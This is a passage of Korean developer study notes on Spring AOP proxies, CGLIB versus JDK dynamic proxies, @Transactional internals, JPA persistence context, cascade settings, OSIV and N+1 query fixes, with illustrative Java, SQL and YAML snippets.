    // 위에서 정의한 serviceLayer() 포인트컷 실행 "전"에 동작
    @Before("serviceLayer()")
    public void beforeMethod() {
        System.out.println("메서드 실행 전입니다!");
    }
    
    // 메서드 실행 "전후"를 모두 제어 (가장 강력함)
    @Around("serviceLayer()")
    public Object aroundMethod(ProceedingJoinPoint pjp) throws Throwable {
        long start = System.currentTimeMillis();
        
        try {
            return pjp.proceed(); // 실제 타겟 메서드 실행
        } finally {
            long end = System.currentTimeMillis();
            System.out.println("실행 시간: " + (end - start) + "ms");
        }
    }
    ```

4.  **JoinPoint**
    -   **현재 실행 중인 지점**의 정보를 담고 있는 객체입니다. (메서드왕 파라미터 정보 등)
    ```java
    @Before("...")
    public void log(JoinPoint joinPoint) {
        // 실행되는 메서드 이름 가져오기
        String methodName = joinPoint.getSignature().getName();
        // 파라미터 값 가져오기
        Object[] args = joinPoint.getArgs();
        System.out.println(methodName + " 실행됨. 파라미터: " + Arrays.toString(args));
    }
    ```

5.  **Weaving (위빙)**
    -   작성한 Advice 코드를 실제 핵심 로직 코드 사이에 **끼워 넣는 연결 과정**입니다. (스프링은 런타임에 프록시 객체를 생성하여 위빙)

6.  **Proxy (프록시)**
    -   클라이언트가 거쳐가는 **대리자 객체**입니다.
    -   `Client -> Proxy -> Target(실제 객체)` 흐름으로 진행됩니다.

> **스프링의 대표적인 AOP 적용 사례**
> 1.  **@Transactional**: `try-catch-rollback/commit` 코드를 감싸서 처리.
> 2.  **@Cacheable**: 메서드 실행 전 캐시 확인 -> 있으면 바로 반환(Skip), 없으면 실행 후 저장.
> 3.  **@Async**: 메서드 호출 시 가로채서 별도 스레드(TaskExecutor)에 할당하라고 지시.
> 4.  **@Retryable**: 예외 발생 시 `catch`하여 설정된 횟수만큼 재시도(`proceed()` 재호출).

> **Q. @Aspect만 붙이면 되나요?**
> 아니요! **Aspect = Advice(할 일) + Pointcut(할 곳)** 입니다.
> 껍데기(Aspect) 안에 '어디서(Pointcut) 무엇을(Advice) 할지'가 없으면 아무 일도 일어나지 않습니다.

**실전 사용 예시 (종합)**
```java
@Aspect      // 1. Aspect 선언 (껍데기)
@Component   // 2. 빈 등록
public class PerformanceAspect {

    // 3. Pointcut: "어디서?" -> com.example.service 패키지의 모든 메서드에서
    @Pointcut("execution(* com.example.service.*.*(..))")
    public void serviceLayer() {}

    // 4. Advice: "무엇을?" -> 시간 측정을 해라
    @Around("serviceLayer()") // 위에서 정의한 Pointcut 사용
    public Object measureTime(ProceedingJoinPoint pjp) throws Throwable {
        
        // [메서드 정보 가져오기]
        MethodSignature signature = (MethodSignature) pjp.getSignature();
        String methodName = signature.getMethod().getName();
        
        System.out.println("[Start] " + methodName); // 메서드 실행 전
        long start = System.currentTimeMillis();
        
        try {
            // [실제 메서드 실행] 
            // 이 proceed()를 호출해야만 비즈니스 로직(Target)으로 넘어갑니다.
            return pjp.proceed(); 
        } finally {
            // 메서드 실행 후
            long end = System.currentTimeMillis();
            System.out.println("[End] " + methodName + " : " + (end - start) + "ms");
        }
    }
}
```
 
> **Q. AOP는 메서드 단위로만 적용되나요?**
> 네, **Spring AOP**는 "메서드 실행"만 가로챌 수 있습니다.
> 1.  **필드/생성자**: 프록시 방식의 한계로 불가능합니다. (AspectJ 라이브러리 사용 시 가능)
> 2.  **private 메서드**: 프록시가 상속(CGLIB)받거나 인터페이스를 구현해야 하는데 `private`은 접근 불가능하므로 적용 안 됩니다.
> 3.  **내부 호출 (Self-Invocation)**: `this.method()` 처럼 자기 클래스 내부에서 호출하면 프록시를 거치지 않고 다이렉트로 호출하므로 AOP가 발동하지 않습니다.

</details>

<details>
<summary>JDK Dynamic Proxy vs CGLIB (프록시 생성 방식의 차이)</summary>

<br>

Spring AOP가 프록시 객체를 만들 때 사용하는 두 가지 핵심 기술입니다.

| 구분       | **JDK Dynamic Proxy**             | **CGLIB** (Code Generator Library)                                       |
| :--------- | :-------------------------------- | :----------------------------------------------------------------------- |
| **대상**   | **인터페이스**가 반드시 있어야 함 | **클래스**만 있어도 가능 (상속 방식)                                     |
| **기술**   | Java Reflection API 사용          | 바이트코드 조작 (Bytecode manipulation)                                  |
| **성능**   | 리플렉션을 써서 상대적으로 느림   | 바이트코드를 직접 생성하므로 **더 빠름**                                 |
| **제약**   | 인터페이스 구현 필수              | `final` 클래스나 `final` 메서드는 오버라이딩 불가하므로 프록시 생성 불가 |
| **스프링** | 과거 기본값 (인터페이스 O)        | **Spring Boot 2.0부터 기본값** (인터페이스 유무 상관없이 사용)           |

> **요약**:
> 옛날에는 "인터페이스가 있으면 JDK Proxy, 없으면 CGLIB"를 썼지만,
> **최근**(Spring Boot)에는 성능 좋고 제약이 적은 **CGLIB**를 기본으로 사용해서 통일성을 유지합니다.

> **Q. CGLIB는 리플렉션 없이 어떻게 정보를 가져오나요?**
>
> CGLIB는 **ASM**(자바 바이트코드 조작 프레임워크)을 사용하여 클래스의 `.class` 파일(바이트코드)을 직접 분석하고 조작합니다.
> 1.  **Code Generation**: 런타임에 타겟 클래스를 상속받는 **새로운 클래스의 바이트코드를 메모리상에서 직접 생성**해버립니다.
> 2.  **직접 호출**: 리플렉션처럼 "이름으로 메서드 찾기 -> 호출" 하는 비용 없이, 바이트코드 레벨에서 **부모 메서드를 직접 호출(`super.method()`)** 하도록 연결해두기 때문에 훨씬 빠릅니다.

**스프링은 언제 프록시를 만드나요? (BeanPostProcessor)**
스프링 컨테이너 초기화 시 **BeanPostProcessor** (빈 후처리기)가 개입합니다.
1.  **생성**: 스프링이 `MemberService` 객체를 생성 (`new`).
2.  **후처리**: 빈 후처리기가 `"어? 얘 @Transactional 있네?"` 하고 감지.
3.  **프록시 생성 (CGLIB)**: **ASM** 라이브러리를 통해 `MemberService`를 상속받는 `MemberService$$EnhancerBySpringCGLIB` 클래스(바이트코드)를 메모리에 생성.
4.  **교체(Replace)**: 스프링 컨테이너에 원래 객체 대신 **프록시 객체**를 등록. (그래서 컨트롤러는 프록시를 주입받음)

**왜 CGLIB가 더 빠른가요? (FastClass)**
*   **리플렉션 (JDK Proxy)**: 메서드를 호출할 때마다 "**이 메서드 어디 있지?**" 하고 메타데이터를 **찾는 과정**(Lookup)이 필요합니다.
*   **CGLIB (FastClass)**: 프록시 생성 시, 메서드 호출 경로를 **인덱스(번호)로 매핑**해둔 FastClass라는 것을 같이 만듭니다.
    *   예: "1번 메서드 호출해" -> `switch(1) { case 1: ((MemberService)target).join(); }`
    *   **찾는 과정 없이** 바로 해당 메서드를 호출하므로 훨씬 빠릅니다.

``` java
public class MemberService$$FastClassByCGLIB$$abc {
    // 메서드별 인덱스 번호 부여
    private static final int JOIN = 1;
    private static final int FINDBYID = 2;
    private static final int UPDATE = 3;
    
    public Object invoke(int methodIndex, Object target, Object[] args) {
        switch (methodIndex) {  // switch문으로 직접 점프! ⚡
            case JOIN: return ((MemberService) target).join(args);
            case FINDBYID: return ((MemberService) target).findById(args);
            case UPDATE: return ((MemberService) target).update(args);
        }
    }
}

```

</details>

<details>
<summary>@Transactional 동작 원리</summary>

<br>

AOP **프록시(Proxy) 객체**를 통해 동작합니다.

**핵심 원리**:
1.  **프록시 생성**: 스프링은 `@Transactional`이 붙은 빈을 발견하면, 해당 클래스를 상속받은 **가짜 객체**(Proxy)를 생성하여 컨테이너에 등록합니다. (주입받는 놈도 이 프록시를 받음)
2.  **호출 가로채기**: 외부에서 메서드를 호출하면 프록시가 먼저 받습니다. (Intercept)
3.  **트랜잭션 처리 흐름**:
    -   `TransactionManager`에게 **트랜잭션 시작** 요청 (`conn.setAutoCommit(false)`)
    -   **실제 객체의 메서드 호출** (비즈니스 로직 수행)
    -   **성공 시**: `commit()`
    -   **예외 발생 시** (RuntimeException): `rollback()`
    -   **종료**: 커넥션 반납 및 트랜잭션 종료
    
    ```java
    // [우리가 짠 실제 서비스 코드]
    @Service
    public class MemberService {
        @Transactional // <- 이거 때문에 프록시가 탄생함
        public void join(Member member) {
            memberRepository.save(member);
        }
    }

    // [컨트롤러: 실제 사용]
    @Controller
    public class MemberController {
        private final MemberService memberService; // <- 여기엔 실제 객체 대신 '프록시(가짜)'가 주입됨!
        
        public void request() {
            memberService.join(member); // 프록시의 join()이 먼저 호출됨
        }
    }
    
    // [스프링이 만든 프록시 코드 (실제 동작 방식)]
    public class MemberServiceProxy extends MemberService {
        // 이 안에 트랜잭션 Advisor 등이 들어있음
        private MethodInterceptor interceptor; 

        public void join(Member member) {
            // "나는 껍데기일 뿐, 실제 일은 인터셉터(Advisor)에게 넘긴다!"
            interceptor.intercept(this, "join", member);
            
            // -> 인터셉터가 [트랜잭션 시작 -> 실제 join 호출 -> 커밋] 과정을 수행함
        }
    }
    ```

</details>

</details>

</details>

<details>
<summary>스프링 AOP와 프록시의 모든 것 (동작 원리 완전 정복)</summary>

<br>

**1. 프록시 생성 (초기화 시점)**
스프링 컨테이너가 뜰 때 **BeanPostProcessor** (빈 후처리기)가 작동합니다.
*   **감지**: `@Transactional`이나 `@Aspect`가 붙은 빈을 **리플렉션**으로 찾아냅니다.
*   **생성**: **ASM**을 이용해 해당 클래스를 상속받은 "**가짜 객체** (Proxy)"를 만들고, 원래 객체 대신 컨테이너에 등록합니다. (DI도 이 프록시가 받음)

**2. 프록시 구조 (메모리)**
프록시 객체는 내부에 **Interceptor**를 가지고 있고, 이 인터셉터는 **Advisor 목록**을 가지고 있습니다.
*   **Advisor**: `Pointcut` + `Advice` 한 세트. (`@Aspect` 클래스 안의 메서드(`@Around`) 하나하나가 각각의 Advisor로 변환됨)

**3. 실행 흐름 (런타임)**
클라이언트가 메서드를 호출하면 다음과 같은 과정이 일어납니다.

> **Client** -> **Proxy** -> **Advisor 1** -> **Advisor 2** -> **Target** (실제 객체)

```java
// [1. 프록시] (껍데기 - CGLIB가 만든 자식 클래스)
// "난 껍데기야. 인터셉터한테 토스!"
public class MemberService$$EnhancerBySpringCGLIB extends MemberService {
    private MethodInterceptor interceptor; // Advisor들이 여기 들어있음

    public void join(Member member) {
        interceptor.intercept(this, "join", member);
    }
}

// [2. 어드바이저] (중간 관리자)
// "트랜잭션 열고 다음 타자 넘겨!"
class TransactionAdvisor {
    public void invoke(Chain chain) {
        txManager.begin(); // [Before]
        
        // 다음 타자(Advisor 또는 Target) 호출
        chain.proceed();   
        
        txManager.commit(); // [After]
    }
}

// [3. 체인의 끝] (실제 객체 호출 - CGLIB 방식)
class CglibMethodInvocation {
    private MethodProxy methodProxy; // FastClass 정보를 가지고 있는 녀석!
    
    public Object proceed() {
        if (advisorIndex == advisors.size() - 1) {
            // [Final Destination]
            // 리플렉션 없이 FastClass를 이용해 타겟 메서드 호출
            return methodProxy.invoke(target, args); 
        }
        // ... 다음 Advisor 실행
    }
}

// [4. FastClass] (도우미 - 리플렉션 없이 메서드 호출)
// methodProxy.invoke()가 호출되면 내부적으로 이 클래스의 invoke()가 실행됩니다.
public class MemberService$$FastClassBySpringCGLIB {
    public Object invoke(int index, Object target, Object[] args) {
        // 인덱스(번호)로 메서드를 바로 찾아서 실행! (Lookup 비용 0)
        switch (index) { 
            case 1: return ((MemberService) target).join(args[0]);
            case 2: return ((MemberService) target).findById(args[0]);
            default: return null;
        }
    }
}



```

**4. 순서 제어**
`@Order` 어노테이션으로 Advisor의 실행 순서를 정할 수 있습니다. (숫자가 낮을수록 바깥쪽)

```java
@Aspect
@Order(1) // 먼저 실행 (바깥쪽)
public class LogAspect { ... }

@Aspect
@Order(2) // 나중에 실행 (안쪽)
public class TxAspect { ... }
```

> **주의! 하나의 Aspect 클래스 안에 여러 Advice가 있다면?**
> *   **순서 보장 불가**: 같은 클래스 내의 메서드끼리는 `@Order`를 붙여도 순서가 보장되지 않습니다.
> *   **해결책**: 순서가 중요하다면 무조건 **별도의 Aspect 클래스**로 쪼개야 합니다.

</details>

<details>
<summary>Spring Boot 실행 원리 (@SpringBootApplication과 main)</summary>

<br>

**Q. 왜 `@SpringBootApplication`이 붙은 main 메서드를 실행해야 하나요?**

```java
@SpringBootApplication  // 핵심 어노테이션
@EnableScheduling
@EnableRetry
public class CherrydanApplication {

    public static void main(String[] args) {
        // 이 한 줄이 스프링의 모든 마법을 시작합니다.
        SpringApplication.run(CherrydanApplication.class, args);
    }

}
```

1.  **Java의 진입점 (Entry Point)**
    -   Spring Boot도 결국은 **Java 프로그램**입니다. JVM이 실행할 수 있는 시작점(`public static void main`)이 반드시 필요합니다.

2.  **SpringApplication.run() 의 역할**
    -   **스프링 컨테이너 생성**: `ApplicationContext`를 생성하여 빈(Bean)들을 관리할 준비를 합니다.
    -   **내장 서버 실행**: (웹 앱인 경우) 내장된 **Tomcat**을 띄워서 HTTP 요청을 받을 준비를 합니다.

3.  **@SpringBootApplication 의 정체**
    이 어노테이션은 다음 3가지 핵심 어노테이션을 합친 것입니다.
    -   `@SpringBootConfiguration`: 스프링 설정 클래스임을 명시.
    -   `@EnableAutoConfiguration`: **자동 설정**. `jar` 의존성을 보고 "어? JPA가 있네? DB 설정을 자동으로 해줘야지" 하고 빈을 등록해 줍니다.
    -   `@ComponentScan`: 현재 패키지 하위의 모든 컴포넌트(`@Controller`, `@Service` 등)를 찾아서 빈으로 등록합니다.

</details>

<details>
<summary>JPA (Java Persistence API) 개념과 영속성 컨텍스트</summary>

<br>

**1. JPA란?**
자바 진영의 **ORM**(Object-Relational Mapping) 기술 표준으로, 인터페이스의 모음입니다. (구현체: Hibernate 등)
객체는 객체대로, 관계형 DB는 관계형 DB대로 설계하고, **ORM 프레임워크가 중간에서 매핑**해줍니다.

**2. 왜 쓰나요? (장점)**
*   **생산성**: 지루한 CRUD SQL을 작성하지 않아도 됩니다. (`jpa.save(member)`)
*   **유지보수**: 필드 변경 시 모든 SQL을 수정할 필요가 없습니다.
*   **패러다임 불일치 해결**: 상속, 연관관계, 객체 그래프 탐색 등 객체지향적인 코드로 DB를 다룰 수 있습니다.

**단점 (기술적 한계)**
*   **복잡한 쿼리의 한계**: 동적 쿼리나 복잡한 통계성 쿼리를 JPQL만으로 처리하기 어렵습니다. (**QueryDSL**이나 Native SQL이 필수적으로 요구됨)
*   **세밀한 성능 제어의 어려움**: 메서드 하나로 쿼리가 자동 생성되므로, 의도치 않은 조인이나 비효율적인 쿼리가 발생할 수 있어 실행 계획 확인이 필수입니다.
*   **N+1 문제**: 연관 관계 설정 시 즉시 로딩(EAGER) 등에 의해 불필요한 쿼리가 폭발할 수 있습니다.

**3. 영속성 컨텍스트 (Persistence Context)**
**엔티티를 영구 저장하는 환경**이라는 논리적인 개념입니다. (`EntityManager`가 관리)

**핵심 기능 (엔티티 생명주기 관리)**
1.  **1차 캐시**: 영속성 컨텍스트 내부에 있는 캐시 맵(`Map<ID, Entity>`).
    *   조회 시 DB보다 먼저 1차 캐시를 확인하여 성능상의 이점을 얻습니다. (단, 트랜잭션 범위 내에서만 유효)
2.  **동일성**(Identity) 보장: 같은 트랜잭션 내에서 같은 ID로 조회한 엔티티는 **`==` 비교 시 true**임이 보장됩니다.
    *   **JPA가 없다면**(MyBatis 등): 같은 ID 데이터를 두 번 조회하면, **매번 새로운 객체**(`new`)가 생성되므로 주소값이 달라 `==` 비교가 **false**가 됩니다. (오직 `.equals()`로만 비교 가능)
    *   **JPA**: 1차 캐시에 있는 **같은 객체 주소**를 반환하므로, 자바 컬렉션에서 꺼낸 것처럼 `==`이 **true**가 됩니다.
3.  **트랜잭션을 지원하는 쓰기 지연**(Transactional Write-Behind):
    *   `persist()`를 해도 바로 INSERT 쿼리가 나가지 않습니다.
    *   **쓰기 지연 SQL 저장소**에 쿼리를 모아뒀다가, 트랜잭션 **커밋**(`commit`) 시점에 한 번에 날립니다(`flush`).
    * **Flush(플러시)란?**: 영속성 컨텍스트의 변경 내용을 **DB에 동기화**하는 과정입니다. (INSERT, DELETE 등 쿼리 전송)
       *   **주의 1**: **1차 캐시를 비우지 않습니다.** (그대로 유지됨)
       *   **주의 2**: 플러시를 했다고 끝이 아닙니다. 실제 **커밋**(Commit)은 **트랜잭션이 끝나야** DB에 반영됩니다.
4.  **변경 감지**(Dirty Checking):
    *   엔티티의 데이터를 수정할 때 `update()` 같은 메서드를 부를 필요가 없습니다.
    *   조회 당시의 상태(**스냅샷**)를 간직하고 있다가, 커밋 시점에 현재 상태와 비교하여 **변경된 부분만 UPDATE 쿼리**를 자동으로 생성합니다.

**4. `save()` 메서드의 동작 원리 (Upsert)**
JPA의 `save()`는 **저장**(Insert)과 **수정**(Update)을 모두 처리합니다.

```java
@Transactional
@Override
public <S extends T> S save(S entity) {
    if (entityInformation.isNew(entity)) {
        em.persist(entity); // ID가 없으면(null) -> 신규 저장 (INSERT)
        return entity;
    } else {
        return em.merge(entity); // ID가 있으면 -> 병합 (SELECT 후 UPDATE)
    }
}
```
*   **새로운 엔티티**(`isNew`): 식별자(PK)가 `null`이거나 기본형 0일 때 -> `persist()` (영속화)
*   **이미 있는 엔티티**: 식별자 값이 있을 때 -> `merge()`
    *   **주의**: `merge`는 DB에서 데이터를 먼저 조회(SELECT)한 뒤 덮어쓰기 때문에 성능상 조금 불리할 수 있습니다. 변경 감지를 이용하는 것이 좋습니다.

</details>

<details>
<summary>영속성 전이(Cascade)와 고아 객체</summary>

<br>

**1. 영속성 전이(Cascade)와 고아 객체(Orphan Removal)**
부모 엔티티의 상태 변화를 자식 엔티티에게 전파하거나, 연관관계가 끊어진 자식을 자동 삭제하는 기능입니다.

*   **영속성 전이**(`CascadeType.ALL`): 부모를 저장(`persist`)하거나 삭제(`remove`)할 때 자식도 같이 처리합니다.
*   **고아 객체**(`orphanRemoval = true`): 부모의 컬렉션에서 자식을 제거(`list.remove()`)하면, DB에서도 해당 자식을 삭제(`DELETE`)합니다.

```java
// Parent.java (부모 엔티티)
// 부모 저장/삭제 시 자식 전파 + 리스트에서 제거 시 DB 삭제 (완전한 소유)
@OneToMany(mappedBy = "parent", cascade = CascadeType.ALL, orphanRemoval = true)
private List<Child> children = new ArrayList<>();
```

**상세 동작 예시**

**1. "자식도 같이 처리한다"의 의미 (`CascadeType.ALL`)**
개발자가 자식을 일일이 저장(`em.persist(child)`)할 필요 없이, 부모만 저장하면 됩니다.
```java
Parent parent = new Parent();
Child child = new Child();
parent.addChild(child);

em.persist(parent); 
// 결과: 부모가 저장되면서, 자식(Child)도 자동으로 INSERT 쿼리가 나갑니다. (전파)
```

> **Q. 부모를 지우면 자식도 다 지워지나요? (Delete Query)**
> 네, `CascadeType.ALL`이나 `REMOVE`가 있으면 부모 삭제 시(`em.remove(parent)`) 자식들도 모두 삭제됩니다.
>
> **주의**: JPA는 자식을 **하나씩** 찾아서 지웁니다. 자식이 100명이면 `DELETE` 쿼리가 **100번** 나갈 수 있어 성능에 주의해야 합니다. 
> (자식이 너무 많으면 JPQL로 한 방에 지우는 게 좋습니다: `delete from Child c where c.parent = :p`)

**2. 영속성 전이만 있고 `orphanRemoval`이 없을 때 (`orphanRemoval=false`)**
```java
@OneToMany(cascade = CascadeType.ALL) // 고아 객체 제거 옵션 끔
List<Child> children;
...
// 부모의 리스트에서 자식을 쫓아냄
parent.getChildren().remove(0); 
```
*   **결과**: 자바 컬렉션에서는 사라졌지만, **DB에는 데이터가 그대로 살아있습니다.** (외래키만 Null이 되거나 그대로 유지됨 → **좀비 데이터 발생**)
*   DB에서도 지우고 싶다면 `orphanRemoval = true`를 꼭 켜야 합니다.

**[주의사항 & 차이점]**
*   **차이점**: `CascadeType.REMOVE`는 부모를 지울 때만 자식이 지워지지만, `orphanRemoval=true`는 컬렉션에서 `remove()`만 해도 자식이 지워집니다.
*   **사용 기준**: 자식 엔티티가 **"오직 이 부모에게만 소유될 때"** (소유자가 하나일 때) 사용해야 합니다. (예: 게시글-첨부파일)
    *   만약 자식이 다른 곳에서도 참조되는 엔티티(예: 관리자가 관리하는 멤버)라면, 함부로 지워져선 안 되므로 사용하면 안 됩니다.

</details>

<details>
<summary>OSIV (Open Session In View)</summary>

<br>

**OSIV (Open Session In View)**
영속성 컨텍스트(DB 연결)를 **뷰 레이어(Controller, View Template)까지 열어두는 전략**입니다. 

(Sping Boot 기본값: `true`)

> **Q. 왜 쓰나요? (장점)**
> **화면 변경에 유연하게 대처할 수 있기 때문입니다.** (생산성 UP)
>
> 예를 들어, **"화면에 갑자기 `Team` 이름도 보여주세요!"** 라는 요청이 왔을 때:
> *   **OSIV OFF**: Service 코드를 열어서 `fetch join` 쿼리를 짜거나 DTO를 만들어 데이터를 다 채워서 보내야 합니다. (화면 때문에 비즈니스 로직 수정)
> *   **OSIV ON**: Service는 건드릴 필요 없이, 그냥 View/Controller에서 `member.getTeam().getName()` 호출만 하면 알아서 쿼리가 나가서 해결됩니다. (편-안)

```java
// Controller
@GetMapping("/members/{id}")
public String getMember(@PathVariable Long id, Model model) {
    Member member = memberService.find(id); // 서비스 종료 (트랜잭션 끝)
    
    // [OSIV ON]: DB 커넥션이 유지되므로 지연 로딩 가능 (Good for 개발속도)
    // [OSIV OFF]: 에러 발생 (LazyInitializationException) -> 트랜잭션 없어서 못 가져옴
    model.addAttribute("teamName", member.getTeam().getName()); 
    
    return "memberView";
}
```

**동작 방식**
*   **ON (True)**: 요청이 들어와서 응답이 나갈 때까지 영속성 컨텍스트와 DB 커넥션을 계속 유지합니다.
    *   **서비스 계층**: 트랜잭션 시작 ~ 종료 (수정 가능)
    *   **뷰 계층 (Controller)**: **트랜잭션은 끝났지만** 영속성 컨텍스트는 살아있음. (Nontransactional Reads)
        *   **커넥션**: 계속 붙들고 있음 (반환 X)
        *   **트랜잭션**: 이미 커밋되어 종료됨 (수정 X, 롤백 X)
        *   **결과**: 커넥션이 있으니 **단순 조회(Select)는 가능**하지만, 데이터 변경은 반영되지 않음.

    > **Q. 영속성 컨텍스트만 남기고 커넥션은 반환하면 안 되나요?**
    > **안 됩니다.** 지연 로딩(`Lazy Loading`)의 본질은 **필요할 때 DB에 SQL을 날려 데이터를 가져오는 것**이기 때문입니다.
    > SQL을 날리려면 **DB 커넥션**이 반드시 필요합니다.
    >
    > 커넥션 없이 지연 로딩을 시도하면 `LazyInitializationException`이 발생합니다.

    *   **장점**: `Controller`나 View에서도 지연 로딩(`lazy loading`)이 가능합니다. (`entity.getChild().getName()`)
    *   **단점**: DB 커넥션을 너무 오래 물고 있습니다. 외부 API 호출 등 시간이 오래 걸리는 작업이 껴있으면 **커넥션 풀 고갈**(Connection Pool Exhaustion)로 장애가 발생할 수 있습니다.
*   **OFF (False)**: 트랜잭션 종료 시(`Service` 계층 종료 시) 영속성 컨텍스트도 닫고 DB 커넥션을 반환합니다.
    *   **장점**: DB 커넥션을 짧게 쓰고 반환하므로 실시간 트래픽 처리에 유리합니다.
    *   **단점**: 모든 지연 로딩 코드를 `Service` 계층 안에서 처리하고, 결과를 DTO로 변환해서 컨트롤러 반환해야 합니다. (`LazyInitializationException` 발생 주의)

> **권장**: 트래픽이 많은 서비스라면 **`spring.jpa.open-in-view: false`** 로 끄는 것이 정석입니다.

</details>

<details>
<summary>JPA N+1 문제와 해결 방법</summary>

<br>

**N+1 문제**: 1번의 쿼리로 조회한 엔티티와 연관된 엔티티를 조회하기 위해 N번의 추가 쿼리가 발생하는 성능 이슈.
> **상황 예시 (Team : Member = 1 : N)**
> ```java
> // 1. 전체 멤버 조회 (쿼리 1방)
> List<Member> members = memberRepository.findAll();
> 
> // 2. 각 멤버의 팀 이름을 사용할 때마다 추가 쿼리 발생 (N방)
> for (Member member : members) {
>     System.out.println(member.getTeam().getName());
> }
> // 결과: 멤버가 100명이면 쿼리가 총 101번(1 + 100) 나감. 💥
> ```

**해결 방법과 동작 원리**

### 1. Fetch Join vs 일반 Join

**차이점 요약**
*   **일반 JOIN**: 연관 Entity를 `JOIN` 하긴 하지만, **SELECT 절에는 포함하지 않습니다.** (조회 주체인 엔티티만 가져옴). 나중에 연관 객체를 쓸 때 쿼리가 다시 나갑니다(지연 로딩).
*   **Fetch JOIN**: 연관 Entity까지 **SELECT 절에 포함하여 한방에 가져옵니다.** (즉시 로딩 효과). 영속성 컨텍스트에 모두 담깁니다.

**상세 쿼리 비교**

**A. 일반 Join 사용 (`join`)**
```java
// TeamRepository.java
@Query("SELECT distinct t FROM Team t JOIN t.members")
public List<Team> findAllWithMembersUsingJoin();
```
▼ **실행되는 SQL** (SELECT 절에 `member` 컬럼이 없음!)
```sql
SELECT
    distinct t.id,
    t.name
FROM team t
INNER JOIN member m ON t.id = m.team_id
```
> **문제**: 쿼리로는 조인을 했지만, 실제 데이터는 `Team`만 가져왔습니다. 이후 `team.getMembers()`를 호출하면 그때마다 Member를 찾는 쿼리가 또 나갑니다.

**B. Fetch Join 사용 (`join fetch`)**
```java
// TeamRepository.java
@Query("SELECT distinct t FROM Team t JOIN FETCH t.members")
public List<Team> findAllWithMembersUsingFetchJoin();
```
▼ **실행되는 SQL** (SELECT 절에 `member`까지 다 긁어옴)
```sql
SELECT
    distinct t.id,
    t.name,
    m.id,       -- Member 컬럼1
    m.name,     -- Member 컬럼2
    m.age,      -- Member 컬럼3
    m.team_id   -- Member 컬럼4
FROM team t
INNER JOIN member m ON t.id = m.team_id
```
> **결과**: `Team`을 조회할 때 `Member` 데이터까지 이미 **영속성 컨텍스트에 다 퍼왔으므로**, 나중에 `getMembers()`를 해도 추가 쿼리가 나가지 않습니다.

**Fetch Join의 한계와 위험성 코드 예시**

1.  **둘 이상의 컬렉션 Fetch Join 불가** (`MultipleBagFetchException`)
    ```java
    // Team -> Members(1:N) 과 Team -> Orders(1:N) 둘 다 Fetch Join 시도
    @Query("select t from Team t join fetch t.members join fetch t.orders")
    List<Team> findAll(); // MultipleBagFetchException 발생! (데이터 뻥튀기 감당 불가)
    ```

2.  **페이징 API 사용 불가** (메모리 경고)
    ```java
    @Query("select t from Team t join fetch t.members")
    Page<Team> findAll(Pageable pageable); 
    ```
    > **실행 시 로그 경고**:
    > `HHH000104: firstResult/maxResults specified with collection fetch; applying in memory!`
    > (경고: 너 컬렉션 페치 조인에 페이징 걸었네? **DB에서 페이징 못하니까 100만 건 다 퍼와서 메모리에서 자를게.** -> **서버 다운 위험**)

    > **Q. 왜 DB에서 페이징(`LIMIT`)을 못하나요?**
    > **데이터 뻥튀기** 때문입니다. `1:N` 조인을 하면 부모 데이터가 자식 수만큼 복제되어 행(Row)이 늘어납니다.
    > 이때 DB에서 `LIMIT 1`을 걸어버리면, 부모(Team)의 일부 자식(Member) 데이터가 짤린 채로 조회되어 **객체 정합성(데이터 누락)**이 깨집니다.
    >
    > **[예시: Team A (멤버: 철수, 영희)]**
    > | Team | Member | 비고 |
    > | :--- | :--- | :--- |
    > | **Team A** | 철수 | Row 1 |
    > | **Team A** | 영희 | Row 2 (**뻥튀기 발생**) |
    >
    > 여기서 `LIMIT 1`을 하면 **'철수'만 조회되고 '영희'는 잘려나갑니다.**
    > Java 객체로는 `Team A`의 멤버가 1명뿐인 것처럼 보이게 되어 **데이터 오류**가 발생합니다.

3.  **별칭(Alias) 사용 불가**
    -   Fetch Join 대상에게 별칭을 줘서 **"일부만"** 필터링해서 가져오면 객체 정합성이 깨집니다.
    ```java
    // ❌ 절대 금지: 팀의 멤버 중 '20살 이상만' 걸러서 팀 엔티티에 담겠다?
    @Query("select t from Team t join fetch t.members m where m.age > 20")
    List<Team> findAll(); 
    ```
    > **이유**: JPA에서 `Team.members`는 "그 팀의 **모든** 멤버"여야 합니다. 일부만 담기면, 나중에 이 Team 객체에서 멤버를 지우거나 추가할 때 데이터가 꼬이게 됩니다.

### 2. @EntityGraph

`join fetch` 쿼리를 직접 짜기 귀찮을 때, 어노테이션으로 해결하는 방법입니다. 내부적으로 **Left Outer Join**을 사용합니다.
(기본 `join fetch`는 Inner Join이라 연관된 데이터가 없으면 본인 데이터도 조회되지 않지만, **Left Outer Join**은 연관 데이터가 없어도 본인 데이터는 조회되므로 안전합니다.)

```java
// MemberRepository.java
@EntityGraph(attributePaths = {"team"}) // member 조회 시 team도 같이 가져와!
@Query("select m from Member m")
List<Member> findAllEntityGraph();
```

▼ **실행되는 SQL**
```sql
SELECT
    m.id, m.name, 
    t.id, t.name  -- team 정보도 같이 SELECT
FROM member m
LEFT OUTER JOIN team t ON m.team_id = t.id
```

**한계**:
- 결국 내부적으로 Fetch Join을 쓰는 것이므로, 컬렉션 페치 조인 시 **페이징 문제** 등은 동일하게 발생합니다.

### 3. Batch Size (페이징 해결사)

컬렉션 페치 조인의 페이징 한계를 극복하는 가장 깔끔한 방법입니다. `IN` 절을 사용해 설정한 개수만큼 묶어서 조회합니다.

**설정 방법 1. application.yml (전역 설정 - 권장)**
```yaml
spring:
  jpa:
    properties:
      hibernate:
        default_batch_fetch_size: 1000  # 보통 100~1000 사이 권장
```

**설정 방법 2. @BatchSize (개별 설정)**
- **컬렉션 (1:N)**: 필드 위에 붙입니다.
- **엔티티 (N:1)**: 대상 **클래스 위**에 붙입니다. (예: `Team`이 아니라 `Member` 입장에서 `Team`을 가져올 때)

```java
@Entity
@BatchSize(size = 100) // N:1 관계에서 Team을 조회할 때도 배치가 적용됨!
public class Team {
    ...
    @BatchSize(size = 100) // 1:N 관계 (컬렉션 페이징 해결)
    @OneToMany(mappedBy = "team")
    private List<Member> members = new ArrayList<>();
}
```

▼ **실행되는 SQL (Batch 적용 시)**
```sql
-- 1. [컬렉션 1:N] Team -> Members 조회 시
SELECT * FROM member 
WHERE team_id IN (1, 2, 3, ..., 100)

-- 2. [엔티티 N:1] Member -> Team 조회 시 (위의 상황 예시 해결)
SELECT * FROM team 
WHERE id IN (1, 2, 3, ..., 100)
```

</details>

<details>
<summary>Filter vs Interceptor</summary>

<br>

| 구분          | **Filter** (필터)                                                                                                        | **Interceptor** (인터셉터)                                                                                                                     |
